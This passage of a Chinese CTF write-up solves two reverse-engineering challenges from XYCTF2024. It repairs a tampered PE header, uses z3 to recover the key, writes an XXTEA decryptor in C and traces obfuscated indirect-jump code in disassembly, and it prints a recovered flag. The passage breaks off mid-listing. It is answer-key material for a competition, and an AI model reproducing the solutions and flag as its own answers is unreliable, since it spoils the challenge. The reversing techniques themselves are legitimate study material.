class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    s.add(a1[i]==<span class="built_in">ord</span>(flag[i]))</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">ans = s.model()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inp:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(ans[i].as_long()),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="舔狗四部曲–相逢已是上上签">5.21. 舔狗四部曲–相逢已是上上签</h3>
<p>拖进DIE里 看DIE信息以为又nm来一道16位汇编题，但是IDA 16bit模式打不开，HxD打开一看&quot;This program cannot be run in DOS mode&quot;，这不是我们亲爱的DOS头吗，那这题绝对不是16位汇编了啊，那八成是魔改DOS头了，那问题来了，为啥DIE读出来DOS头了没读出来PE头呢，010 启动！</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E7%9B%B8%E9%80%A2%E5%B7%B2%E6%98%AF%E4%B8%8A%E4%B8%8A%E7%AD%BEDIE.png" class title="舔狗四部曲_相逢已是上上签DIE">
<p>合着PE头偏移给改了啊，那我改回去不就好了，把这个值改成100h然后拖进die：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E7%9B%B8%E9%80%A2%E5%B7%B2%E6%98%AF%E4%B8%8A%E4%B8%8A%E7%AD%BE010.png" class title="舔狗四部曲_相逢已是上上签010">
<p>是32位程序呢，拖进DIA里：</p>
<p>先是读进一个key，然后是一大坨比较，然后读入flag，通过key xxtea，最后和v6比较</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E7%9B%B8%E9%80%A2%E5%B7%B2%E6%98%AF%E4%B8%8A%E4%B8%8A%E7%AD%BE_%E7%AE%97%E6%B3%95.png" class title="舔狗四部曲_相逢已是上上签_算法">
<p>先解决key的问题，用z3把他秒了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">byte_422918 = [Int(<span class="string">f&quot;char_<span class="subst">&#123;i&#125;</span>&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">532</span> * byte_422918[<span class="number">5</span>]</span><br><span class="line">    + <span class="number">829</span> * byte_422918[<span class="number">4</span>]</span><br><span class="line">    + <span class="number">258</span> * byte_422918[<span class="number">3</span>]</span><br><span class="line">    + <span class="number">811</span> * byte_422918[<span class="number">2</span>]</span><br><span class="line">    + <span class="number">997</span> * byte_422918[<span class="number">1</span>]</span><br><span class="line">    + <span class="number">593</span> * byte_422918[<span class="number">0</span>]</span><br><span class="line">    == <span class="number">292512</span></span><br><span class="line">)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">576</span> * byte_422918[<span class="number">5</span>]</span><br><span class="line">    + <span class="number">695</span> * byte_422918[<span class="number">4</span>]</span><br><span class="line">    + <span class="number">602</span> * byte_422918[<span class="number">3</span>]</span><br><span class="line">    + <span class="number">328</span> * byte_422918[<span class="number">2</span>]</span><br><span class="line">    + <span class="number">686</span> * byte_422918[<span class="number">1</span>]</span><br><span class="line">    + <span class="number">605</span> * byte_422918[<span class="number">0</span>]</span><br><span class="line">    == <span class="number">254496</span></span><br><span class="line">)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">580</span> * byte_422918[<span class="number">5</span>]</span><br><span class="line">    + <span class="number">448</span> * byte_422918[<span class="number">4</span>]</span><br><span class="line">    + <span class="number">756</span> * byte_422918[<span class="number">3</span>]</span><br><span class="line">    + <span class="number">449</span> * byte_422918[<span class="number">2</span>]</span><br><span class="line">    + (byte_422918[<span class="number">1</span>] *(<span class="number">1</span> &lt;&lt; <span class="number">9</span>))</span><br><span class="line">    + <span class="number">373</span> * byte_422918[<span class="number">0</span>]</span><br><span class="line">    == <span class="number">222479</span></span><br><span class="line">)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">597</span> * byte_422918[<span class="number">5</span>]</span><br><span class="line">    + <span class="number">855</span> * byte_422918[<span class="number">4</span>]</span><br><span class="line">    + <span class="number">971</span> * byte_422918[<span class="number">3</span>]</span><br><span class="line">    + <span class="number">422</span> * byte_422918[<span class="number">2</span>]</span><br><span class="line">    + <span class="number">635</span> * byte_422918[<span class="number">1</span>]</span><br><span class="line">    + <span class="number">560</span> * byte_422918[<span class="number">0</span>]</span><br><span class="line">    == <span class="number">295184</span></span><br><span class="line">)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">524</span> * byte_422918[<span class="number">5</span>]</span><br><span class="line">    + <span class="number">324</span> * byte_422918[<span class="number">4</span>]</span><br><span class="line">    + <span class="number">925</span> * byte_422918[<span class="number">3</span>]</span><br><span class="line">    + <span class="number">388</span> * byte_422918[<span class="number">2</span>]</span><br><span class="line">    + <span class="number">507</span> * byte_422918[<span class="number">1</span>]</span><br><span class="line">    + <span class="number">717</span> * byte_422918[<span class="number">0</span>]</span><br><span class="line">    == <span class="number">251887</span></span><br><span class="line">)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">414</span> * byte_422918[<span class="number">5</span>]</span><br><span class="line">     + <span class="number">495</span> * byte_422918[<span class="number">4</span>]</span><br><span class="line">     + <span class="number">518</span> * byte_422918[<span class="number">3</span>]</span><br><span class="line">     + <span class="number">884</span> * byte_422918[<span class="number">2</span>]</span><br><span class="line">     + <span class="number">368</span> * byte_422918[<span class="number">1</span>]</span><br><span class="line">     + <span class="number">312</span> * byte_422918[<span class="number">0</span>] == <span class="number">211260</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> byte_422918:</span><br><span class="line">    s.add(i&gt;=<span class="number">0</span>)</span><br><span class="line">    s.add(i&lt;=<span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[char_1 = 89,</span><br><span class="line"> char_5 = 33,</span><br><span class="line"> char_4 = 70,</span><br><span class="line"> char_0 = 88,</span><br><span class="line"> char_2 = 67,</span><br><span class="line"> char_3 = 84]</span><br></pre></td></tr></table></figure>
<p>整理一下，key就是<code>XYCTF!</code>，那flag也好说了，xxtea只要逆着算就能还原：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* key = <span class="string">&quot;XYCTF!&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">enc</span><span class="params">(<span class="type">uint32_t</span> *enc)</span></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">12</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">		sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">		<span class="type">uint32_t</span> v6 = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">5</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;++j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">uint32_t</span> next = enc[(j+<span class="number">1</span>)%<span class="number">8</span>];</span><br><span class="line">			<span class="type">uint32_t</span> last = enc[(j<span class="number">-1</span>+<span class="number">8</span>)%<span class="number">8</span>];</span><br><span class="line">			enc[j] +=((last^key[v6^j&amp;<span class="number">5</span>])+(next^sum))^(((<span class="number">16</span>*last)^(next&gt;&gt;<span class="number">3</span>))+((<span class="number">4</span>*next)^(last&gt;&gt;<span class="number">5</span>)));</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re</span><span class="params">(<span class="type">uint32_t</span> *enc)</span></span>&#123;</span><br><span class="line">	<span class="type">uint32_t</span> sum = <span class="number">-0x61C88647</span>*<span class="number">12</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">12</span>;i++)&#123;</span><br><span class="line">      	<span class="type">uint32_t</span> v6 = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">5</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">7</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">			<span class="type">uint32_t</span> next = enc[(j+<span class="number">1</span>)%<span class="number">8</span>];</span><br><span class="line">			<span class="type">uint32_t</span> last = enc[(j<span class="number">-1</span>+<span class="number">8</span>)%<span class="number">8</span>];</span><br><span class="line">			enc[j] -=((last^key[v6^j&amp;<span class="number">5</span>])+(next^sum))^(((<span class="number">16</span>*last)^(next&gt;&gt;<span class="number">3</span>))+((<span class="number">4</span>*next)^(last&gt;&gt;<span class="number">5</span>)));</span><br><span class="line">		&#125;</span><br><span class="line">      	sum += <span class="number">0x61C88647</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">uint32_t</span> arr[] = &#123;<span class="number">0x66697271</span>,<span class="number">0x896E2285</span>,<span class="number">0xC5188C1B</span>,<span class="number">0x72BCFD03</span>,<span class="number">0x538011CA</span>,<span class="number">0x4DA146AC</span>,<span class="number">0x86630D6B</span>,<span class="number">0xF89797F0</span>&#125;; </span><br><span class="line">	<span class="built_in">re</span>(arr);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%X &quot;</span>,arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>,arr);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag：XYCTF{XXTEA_AND_Z3_1s_S0_easy!!}</p>
<h3 id="舔狗四部曲–记忆的时光机">5.22. 舔狗四部曲–记忆的时光机</h3>
<p>好像有点花指令啊，拖进去main张这样：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E8%AE%B0%E5%BF%86%E7%9A%84%E6%97%B6%E5%85%89%E6%9C%BA_%E8%8A%B1%E6%8C%87%E4%BB%A4.png" class title="舔狗四部曲_记忆的时光机_花指令">
<p>看一眼汇编，呃</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E8%AE%B0%E5%BF%86%E7%9A%84%E6%97%B6%E5%85%89%E6%9C%BA_%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%8E%9F%E7%90%86.png" class title="舔狗四部曲_记忆的时光机_花指令原理">
<p>很显然ida没看出来这个jmp rax是啥，而且看样子好像是在main的栈上弄了个地址数组挨个jmp，那我，动调，启动！</p>
<p>把一路的汇编都复制下来，然后整理就行了</p>
<p>main函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">.text:00006421AC80E0C0 endbr64</span><br><span class="line">.text:00006421AC80E0C4 push    r15</span><br><span class="line">.text:00006421AC80E0C6 lea     rdx, sub_6421AC80E220</span><br><span class="line">.text:00006421AC80E0CD lea     rcx, sub_6421AC80E200</span><br><span class="line">.text:00006421AC80E0D4 push    r14</span><br><span class="line">.text:00006421AC80E0D6 lea     rsi, sub_6421AC80E1C0</span><br><span class="line">.text:00006421AC80E0DD mov     r14d, 2</span><br><span class="line">.text:00006421AC80E0E3 lea     r15, unk_6421AC80F310</span><br><span class="line">.text:00006421AC80E0EA push    r13</span><br><span class="line">.text:00006421AC80E0EC lea     r13, a99s                       ; &quot;%99s&quot;</span><br><span class="line">.text:00006421AC80E0F3 push    r12</span><br><span class="line">.text:00006421AC80E0F5 lea     r12, unk_6421AC80F118</span><br><span class="line">.text:00006421AC80E0FC push    rbp</span><br><span class="line">.text:00006421AC80E0FD push    rbx</span><br><span class="line">.text:00006421AC80E0FE lea     ebx, [r14-1]</span><br><span class="line">.text:00006421AC80E102 sub     rsp, 0B8h</span><br><span class="line">.text:00006421AC80E109 mov     rax, fs:28h</span><br><span class="line">.text:00006421AC80E112 mov     [rsp+0E8h+var_40], rax</span><br><span class="line">.text:00006421AC80E11A lea     rax, sub_6421AC80E160</span><br><span class="line">.text:00006421AC80E121 mov     [rsp+0E8h+var_E0], rdx</span><br><span class="line">.text:00006421AC80E126 lea     rdx, sub_6421AC80E1E0</span><br><span class="line">.text:00006421AC80E12D mov     [rsp+0E8h+var_D8], rcx</span><br><span class="line">.text:00006421AC80E132 lea     rcx, sub_6421AC80E240</span><br><span class="line">.text:00006421AC80E139 mov     [rsp+0E8h+var_D0], rdx</span><br><span class="line">.text:00006421AC80E13E lea     rdx, sub_6421AC80E190</span><br><span class="line">.text:00006421AC80E145 mov     [rsp+0E8h+var_C8], rcx</span><br><span class="line">.text:00006421AC80E14A mov     [rsp+0E8h+var_C0], rsi</span><br><span class="line">.text:00006421AC80E14F mov     [rsp+0E8h+var_B8], rdx</span><br><span class="line">.text:00006421AC80E154 mov     [rsp+0E8h+var_E8], rax</span><br><span class="line">.text:00006421AC80E158 jmp     rax</span><br><span class="line">.text:00006421AC80E160 endbr64</span><br><span class="line">.text:00006421AC80E164 lea     rsi, [rsp+arg_38]</span><br><span class="line">.text:00006421AC80E169 mov     ecx, 0Ch</span><br><span class="line">.text:00006421AC80E16E xor     eax, eax</span><br><span class="line">.text:00006421AC80E170 mov     rdi, rsi</span><br><span class="line">.text:00006421AC80E173 rep stosq</span><br><span class="line">.text:00006421AC80E176 mov     dword ptr [rdi], 0</span><br><span class="line">.text:00006421AC80E17C mov     rax, [rsp+rbx*8+0]</span><br><span class="line">.text:00006421AC80E180 add     r14d, 1</span><br><span class="line">.text:00006421AC80E184 lea     ebx, [r14-1]</span><br><span class="line">.text:00006421AC80E188 jmp     rax</span><br><span class="line">.text:00006421AC80E220 endbr64</span><br><span class="line">.text:00006421AC80E224 lea     rdi, byte_6421AC80F008          ; s</span><br><span class="line">.text:00006421AC80E22B add     r14d, 1</span><br><span class="line">.text:00006421AC80E22F call    _puts</span><br><span class="line">.text:00006421AC80E22F</span><br><span class="line">.text:00006421AC80E234 mov     rax, [rsp+rbx*8+0]</span><br><span class="line">.text:00006421AC80E238 lea     ebx, [r14-1]</span><br><span class="line">.text:00006421AC80E23C jmp     rax</span><br><span class="line">.text:00006421AC80E200 endbr64</span><br><span class="line">.text:00006421AC80E204 mov     rdi, r12                        ; s</span><br><span class="line">.text:00006421AC80E207 add     r14d, 1</span><br><span class="line">.text:00006421AC80E20B call    _puts</span><br><span class="line">.text:00006421AC80E20B</span><br><span class="line">.text:00006421AC80E210 mov     rax, [rsp+rbx*8+0]</span><br><span class="line">.text:00006421AC80E214 lea     ebx, [r14-1]</span><br><span class="line">.text:00006421AC80E218 jmp     rax</span><br><span class="line">.text:00006421AC80E1E0 endbr64</span><br><span class="line">.text:00006421AC80E1E4 xor     eax, eax</span><br><span class="line">.text:00006421AC80E1E6 lea     rsi, [rsp+arg_38]</span><br><span class="line">.text:00006421AC80E1EB mov     rdi, r13</span><br><span class="line">.text:00006421AC80E1EE call    ___isoc99_scanf</span><br><span class="line">.text:00006421AC80E1EE</span><br><span class="line">.text:00006421AC80E1F3 cmp     eax, 1</span><br><span class="line">.text:00006421AC80E1F6 jz      short loc_6421AC80E17C</span><br><span class="line">.text:00006421AC80E1F6</span><br><span class="line">.text:00006421AC80E17C mov     rax, [rsp+rbx*8+0]</span><br><span class="line">.text:00006421AC80E180 add     r14d, 1</span><br><span class="line">.text:00006421AC80E184 lea     ebx, [r14-1]</span><br><span class="line">.text:00006421AC80E188 jmp     rax</span><br><span class="line">.text:00006421AC80E240 endbr64</span><br><span class="line">.text:00006421AC80E244 lea     rdi, [rsp+arg_38]</span><br><span class="line">.text:00006421AC80E249 add     r14d, 1</span><br><span class="line">.text:00006421AC80E24D call    check</span><br><span class="line">.text:00006421AC80E24D</span><br><span class="line">.text:00006421AC80E252 mov     ebp, eax</span><br><span class="line">.text:00006421AC80E254 mov     rax, [rsp+rbx*8+0]</span><br><span class="line">.text:00006421AC80E258 lea     ebx, [r14-1]</span><br><span class="line">.text:00006421AC80E25C jmp     rax</span><br><span class="line">.text:00006421AC80E25C</span><br><span class="line">.text:00006421AC80E1C0 endbr64</span><br><span class="line">.text:00006421AC80E1C4 test    ebp, ebp</span><br><span class="line">.text:00006421AC80E1C6 jnz     loc_6421AC80E25E</span><br><span class="line">.text:00006421AC80E1C6</span><br><span class="line">.text:00006421AC80E1CC lea     rdi, s                          ; s</span><br><span class="line">.text:00006421AC80E1D3 call    _puts</span><br><span class="line">.text:00006421AC80E1D3</span><br><span class="line">.text:00006421AC80E1D8 jmp     short loc_6421AC80E17C</span><br><span class="line">.text:00006421AC80E1C4 test    ebp, ebp</span><br><span class="line">.text:00006421AC80E1C6 jnz     loc_6421AC80E25E                ;失败</span><br><span class="line">.text:00006421AC80E1C6</span><br><span class="line">.text:00006421AC80E1CC lea     rdi, aFlag                      ; s</span><br><span class="line">.text:00006421AC80E1D3 call    _puts</span><br><span class="line">.text:00006421AC80E1D3</span><br><span class="line">.text:00006421AC80E1D8 jmp     short loc_6421AC80E17C</span><br></pre></td></tr></table></figure>
<p>稍微整理一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">.text:00006421AC80E0C0 endbr64</span><br><span class="line">.text:00006421AC80E0C4 push    r15</span><br><span class="line">.text:00006421AC80E0C6 lea     rdx, sub_6421AC80E220</span><br><span class="line">.text:00006421AC80E0CD lea     rcx, sub_6421AC80E200</span><br><span class="line">.text:00006421AC80E0D4 push    r14</span><br><span class="line">.text:00006421AC80E0D6 lea     rsi, sub_6421AC80E1C0</span><br><span class="line">.text:00006421AC80E0DD mov     r14d, 2</span><br><span class="line">.text:00006421AC80E0E3 lea     r15, unk_6421AC80F310</span><br><span class="line">.text:00006421AC80E0EA push    r13</span><br><span class="line">.text:00006421AC80E0EC lea     r13, a99s                       ; &quot;%99s&quot;</span><br><span class="line">.text:00006421AC80E0F3 push    r12</span><br><span class="line">.text:00006421AC80E0F5 lea     r12, unk_6421AC80F118</span><br><span class="line">.text:00006421AC80E0FC push    rbp</span><br><span class="line">.text:00006421AC80E0FD push    rbx</span><br><span class="line">.text:00006421AC80E0FE lea     ebx, [r14-1]</span><br><span class="line">.text:00006421AC80E102 sub     rsp, 0B8h</span><br><span class="line">.text:00006421AC80E109 mov     rax, fs:28h</span><br><span class="line">.text:00006421AC80E112 mov     [rsp+0E8h+var_40], rax</span><br><span class="line">.text:00006421AC80E11A lea     rax, sub_6421AC80E160</span><br><span class="line">.text:00006421AC80E121 mov     [rsp+0E8h+var_E0], rdx</span><br><span class="line">.text:00006421AC80E126 lea     rdx, sub_6421AC80E1E0</span><br><span class="line">.text:00006421AC80E12D mov     [rsp+0E8h+var_D8], rcx</span><br><span class="line">.text:00006421AC80E132 lea     rcx, sub_6421AC80E240</span><br><span class="line">.text:00006421AC80E139 mov     [rsp+0E8h+var_D0], rdx</span><br><span class="line">.text:00006421AC80E13E lea     rdx, sub_6421AC80E190</span><br><span class="line">.text:00006421AC80E145 mov     [rsp+0E8h+var_C8], rcx</span><br><span class="line">.text:00006421AC80E14A mov     [rsp+0E8h+var_C0], rsi</span><br><span class="line">.text:00006421AC80E14F mov     [rsp+0E8h+var_B8], rdx</span><br><span class="line">.text:00006421AC80E154 mov     [rsp+0E8h+var_E8], rax</span><br><span class="line">.text:00006421AC80E164 lea     rsi, [rsp+arg_38]</span><br><span class="line">.text:00006421AC80E169 mov     ecx, 0Ch</span><br><span class="line">.text:00006421AC80E16E xor     eax, eax</span><br><span class="line">.text:00006421AC80E170 mov     rdi, rsi</span><br><span class="line">.text:00006421AC80E173 rep stosq</span><br><span class="line">.text:00006421AC80E176 mov     dword ptr [rdi], 0</span><br><span class="line">.text:00006421AC80E184 lea     ebx, [r14-1]</span><br><span class="line">.text:00006421AC80E224 lea     rdi, byte_6421AC80F008          ; s</span><br><span class="line">.text:00006421AC80E22F call    _puts</span><br><span class="line">.text:00006421AC80E238 lea     ebx, [r14-1]</span><br><span class="line">.text:00006421AC80E204 mov     rdi, r12                        ; s</span><br><span class="line">.text:00006421AC80E20B call    _puts</span><br><span class="line">.text:00006421AC80E214 lea     ebx, [r14-1]</span><br><span class="line">.text:00006421AC80E1E4 xor     eax, eax</span><br><span class="line">.text:00006421AC80E1E6 lea     rsi, [rsp+arg_38]</span><br><span class="line">.text:00006421AC80E1EB mov     rdi, r13</span><br><span class="line">.text:00006421AC80E1EE call    ___isoc99_scanf</span><br><span class="line">.text:00006421AC80E184 lea     ebx, [r14-1]</span><br><span class="line">.text:00006421AC80E244 lea     rdi, [rsp+arg_38]</span><br><span class="line">.text:00006421AC80E24D call    check</span><br><span class="line">.text:00006421AC80E252 mov     ebp, eax</span><br><span class="line">.text:00006421AC80E258 lea     ebx, [r14-1]</span><br><span class="line">.text:00006421AC80E1C4 test    ebp, ebp</span><br><span class="line">.text:00006421AC80E1C6 jnz     loc_6421AC80E25E</span><br><span class="line">.text:00006421AC80E1CC lea     rdi, s                          ; s</span><br><span class="line">.text:00006421AC80E1D3 call    _puts</span><br><span class="line">.text:00006421AC80E1D8 jmp     short loc_6421AC80E17C</span><br><span class="line">.text:00006421AC80E1C4 test    ebp, ebp</span><br><span class="line">.text:00006421AC80E1C6 jnz     loc_6421AC80E25E                ;失败</span><br><span class="line">.text:00006421AC80E1CC lea     rdi, aFlag                      ; s</span><br><span class="line">.text:00006421AC80E1D3 call    _puts</span><br><span class="line">.text:00006421AC80E1D8 jmp     short loc_6421AC80E17C</span><br></pre></td></tr></table></figure>
<p>那主函数就是读取字符串调用check了，那接下来看看check：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 